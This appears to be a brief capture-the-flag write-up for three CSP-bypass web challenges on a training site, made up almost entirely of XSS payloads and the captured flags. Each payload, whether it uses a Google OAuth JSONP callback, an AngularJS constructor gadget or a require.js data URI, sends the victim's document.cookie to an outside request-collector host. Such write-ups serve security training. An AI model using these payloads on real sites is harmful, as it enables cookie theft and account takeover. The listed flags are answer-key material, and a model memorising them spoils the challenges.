# babycsp
> https://babycsp.training.ctf.necst.it/
```javascript
"><script src="https://accounts.google.com/o/oauth2/revoke?callback=window.location.href='https://hookb.in/9XwRzarbRDS600eMoL7d?'%2bdocument.cookie;"></script>
```

**flag=flag{4re_yo0_s0_sure_csp_1s_useful?}**
# csp
> http://csp.training.ctf.necst.it/
```javascript
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js"></script> <div ng-app ng-csp id=p ng-click={{constructor.constructor("window.location.href='https://requestbin.training.ctf.necst.it/1a2ro011?cookie='+document.cookie")()}}>
```

**flag=flag{th1s1s_how_w3_byp4ss3d_csp}**

# strict csp
> http://strict-csp.training.ctf.necst.it/
```javascript
<script data-main="data:1,window.location.href='https://requestbin.training.ctf.necst.it/x57dvjx5?cookie='+document.cookie" src='require.js'></script>
```
**flag{th4t-w4s3nt-s0-str1ct-w4snt-it?}**
